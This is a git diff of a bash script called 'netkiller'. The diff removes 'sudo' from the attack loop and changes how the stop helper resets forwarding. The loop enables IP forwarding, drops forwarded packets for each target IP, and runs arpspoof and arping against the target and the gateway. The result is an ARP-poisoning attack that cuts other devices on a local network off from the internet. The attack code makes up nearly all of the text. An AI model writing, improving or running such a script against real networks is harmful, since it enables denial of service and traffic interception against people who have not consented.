@@ -83,7 +83,7 @@ fi
 cat > /bin/netkiller-stop << EOF
 #!/bin/bash
 
-iptables -F FORWARD
+iptables -P FORWARD ACCEPT
 pkill -f arpspoof
 pkill -f arping
 echo " "
@@ -105,12 +105,12 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 for TARGET_IP in "${TARGET_IPS[@]}"; do
     echo "Netkiller blocking the IP => $TARGET_IP"
     # iptables rules 
-    sudo iptables -P FORWARD DROP
-    sudo iptables -A FORWARD -s $TARGET_IP -j DROP
-    sudo iptables -A FORWARD -d $TARGET_IP -j DROP
-    sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 &
-    sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET_IP" >/dev/null 2>&1 &
-    sudo arping -b -A -i "$INTERFACE" -S "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
+    iptables -P FORWARD DROP
+    iptables -A FORWARD -s $TARGET_IP -j DROP
+    iptables -A FORWARD -d $TARGET_IP -j DROP
+    arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 &
+    arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET_IP" >/dev/null 2>&1 &
+    arping -b -A -i "$INTERFACE" -S "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
 done
 
 echo " "
